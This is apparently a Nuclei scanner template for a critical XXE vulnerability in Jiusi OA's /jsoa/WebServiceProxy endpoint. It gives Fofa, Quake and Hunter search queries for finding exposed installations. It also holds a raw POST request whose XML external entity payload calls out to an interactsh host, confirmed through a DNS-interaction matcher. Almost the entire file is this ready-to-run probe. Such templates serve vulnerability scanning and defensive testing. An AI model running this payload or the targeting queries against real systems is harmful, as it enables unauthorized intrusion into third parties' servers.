id: Jiusi_OA_WebServiceProxy_XXE

info:
  name: Jiusi_OA_WebServiceProxy_XXE
  author: HK
  severity: critical
  description: 九思OA /jsoa/WebServiceProxy存在XXE漏洞
  metadata:
    max-request: 1
    Fofa-query: body="/jsoa/login.jsp"
    Quake-query: body="/jsoa/login.jsp"
    Hunter-query: body="/jsoa/login.jsp"
    verified: true

http:
- raw:
  - |-
    @timeout: 30s
    POST /jsoa/WebServiceProxy HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
    Accept: */*
    Accept-Encoding: gzip, deflate, br
    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
    Content-Type: application/x-www-form-urlencoded
    Connection: close
    Content-Length: 66

    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>

  max-redirects: 3
  matchers-condition: and
  matchers:
      - type: word
        words:
          - "dns"
        part: interactsh_protocol